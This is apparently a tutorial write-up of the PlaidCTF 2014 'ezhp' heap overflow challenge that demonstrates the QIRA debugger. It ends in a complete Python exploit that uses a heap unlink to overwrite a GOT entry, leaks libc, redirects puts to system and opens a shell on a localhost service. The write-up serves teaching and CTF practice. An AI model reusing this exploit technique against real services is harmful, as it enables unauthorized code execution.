# Introduction #

ezhp was a 200 point heap overflow problem at PlaidCTF 2014. It makes a good example to showcase some of the powers of QIRA. Grab ezhp from https://qira.googlecode.com/git/tests/ctf/ezhp and play along at home!

# QIRA v0.2 Installation #
This writeup was made with version 0.2 of QIRA, so to match this exactly...
```
# 0.2 is really out of date, use 1.0 and skip qira-server
cd ~/
wget -qO- https://qira.googlecode.com/git/releases/qira-0.2.tar.gz | tar zx
cd qira
./install.sh
```

# Getting Started #

Let's start a QIRA wrapped ezhp listening on localhost:2323. You don't really need the socat wrapping now, but it makes exploiting easier.
```
socat TCP-LISTEN:2323,reuseaddr,fork,bind=localhost EXEC:"qira ./ezhp"
```

Now in another screen(1), we'll start an ezhp instance with
```
nc localhost 2323
```

And in one more screen(2), we'll start the qira-server with
```
qira-server
```

In a browser we'll navigate to http://localhost:3002/. And we'll load ezhp in IDA with the plugin installed. Giving us a layout like

![http://wiki.qira.googlecode.com/git/images/ezhp/picture1.png](http://wiki.qira.googlecode.com/git/images/ezhp/picture1.png)

Obviously, QIRA is on the right side. The three blue, red, and yellow numbers at the top are the changelist number, instruction address, and data address respectively.

The bar on the left of the QIRA window represents time, similar to how the IDA bar represents addresses. The program starts at change 0 at the top left of the screen, and so far has run up to change 184. Change 120 is blue because it's the change selected and red because it's the instruction selected.

Notice how the instruction selected in IDA(push %ebp) matches the instruction in the disassembly view. These will stay in sync if you have IDA plugin installed.

# Taking Action #

Okay, now that everything is up and running, let's add 2 notes of size 16, change note 0 to "hello", and print note 0. Now we see

![http://wiki.qira.googlecode.com/git/images/ezhp/picture2.png](http://wiki.qira.googlecode.com/git/images/ezhp/picture2.png)

So I've pushed into the add\_note function with IDA, and selected the instruction that writes back the new note count. This instruction has run twice(the red changes in the timeline @ 313 and 510), which we'd expect since we added 2 notes.

You can see the pending 2 about to be written there in between the register and memory view. Those views reflect the state of the system at the selected change, in this case 510, and not the current state of the system. If I selected change 511 for example, I would see a 02 00 00 00 @ 0x804a04c in the hex editor view.

Also see that I selected data address 0x804a060, this is the first pointer to the note data. In the timeline view, bright yellow indicates when something was stored at this address(312), and dark yellow indicates when this address was read(597, 622, 719). The reads make sense since we changed and printed that note. Clicking on those changes in the timeline will change the current change and the instruction address, as well as bring you there in IDA.

# Exploitation #

The exploit in this problem is fairly obvious once you see change\_note allows you to send any size you want. It's a trivial heap overflow. So let's push in to 0x804c018, change note 0 to a lot of A's, and delete note 1 at 0x804c03c. Looking at the before and after, we see

![http://wiki.qira.googlecode.com/git/images/ezhp/picture3.png](http://wiki.qira.googlecode.com/git/images/ezhp/picture3.png)

Segfault! And the fatal store that killed the program, 0x41414145 <-- 0x41414141! Looks like a standard list unlink, probably at the two addresses @ 0x804c034. Remember, even though the program segfaulted, QIRA is still live, and we can explore that execution trace; for example, clicking before 840 will show the view before I trashed it with A's.

You can see the exploitation plan coming together, use that free unlink to add a fake note with id 2 pointing at the GOT. Then we can print that note to leak the GOT, and use change\_note to change the puts pointer to system. Let's do this in python

```
import socket
import struct

def q(a):
  return struct.pack("I", a)

def recv_until(st):
  ret = ""
  while st not in ret:
    ret += s.recv(8192)
  return ret

s = socket.create_connection(("localhost", 2323))
print recv_until("option")

s.send("1\n16\n1\n16\n")  # create two notes of size 16
print recv_until("option")

s.send("3\n0\n100\n")     # change note 0 with size 100
print recv_until("your data.")

# 0x0: "/bin/sh\x00"
# 0x8: next 0x10 bytes is padding
# 0x18: keep the 0x25 around cause why not
# 0x1c: target fflush in the GOT @ 0x804A004 (trashes 0x804A00C)
# 0x20: write 0x804A004 to 0x804a068(note slot 2)
s.send("/bin/sh\x00"+"a"*0x10+q(0x25)+q(0x804A004)+q(0x804a068-4))
print recv_until("option")

s.send("2\n1\n")         # delete note 1 to trigger the unlink
print recv_until("option")

s.send("4\n2\n")         # print note 2 to dump the GOT @ 0x804A004 = fflush
dat = recv_until("option")
fflush = struct.unpack("I", dat.split("id.\n")[1][0:4])[0]
print hex(fflush)

```

![http://wiki.qira.googlecode.com/git/images/ezhp/picture4.png](http://wiki.qira.googlecode.com/git/images/ezhp/picture4.png)

Here is the QIRA view post run, and sure enough, the python prints 0xf66747a0, which is the address @ 0x804A004.

# Finishing up #

```
#   95: 000657a0   257 FUNC    WEAK   DEFAULT   12 fflush@@GLIBC_2.0
# 1422: 0003f430   141 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

system = fflush - 0x657a0 + 0x3f430

s.send("3\n2\n8\n")     # change note 2(the GOT) with size 8
print recv_until("your data.")
s.send(q(fflush)+q(system))  # overwrite fflush with fflush and puts with system
# puts is now broken, replaced with calls to system
# so we don't recv

s.send("4\n0\n")        # "print" note 0, which is "/bin/sh\x00"

print " ** SHELL ** "
import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()
```

![http://wiki.qira.googlecode.com/git/images/ezhp/picture5.png](http://wiki.qira.googlecode.com/git/images/ezhp/picture5.png)